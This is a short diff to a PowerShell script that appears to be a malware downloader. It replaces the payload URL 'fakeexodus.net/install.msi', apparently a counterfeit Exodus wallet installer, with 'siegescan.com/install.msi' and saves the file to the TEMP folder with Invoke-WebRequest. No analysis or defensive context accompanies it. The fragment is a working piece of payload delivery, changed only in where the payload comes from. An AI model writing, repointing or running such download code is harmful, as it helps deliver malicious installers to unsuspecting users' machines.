@@ -1,4 +1,4 @@
-$exeUrl = "https://fakeexodus.net/install.msi"
+$exeUrl = "https://siegescan.com/install.msi"
 $exePath = "$env:TEMP\install.msi"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
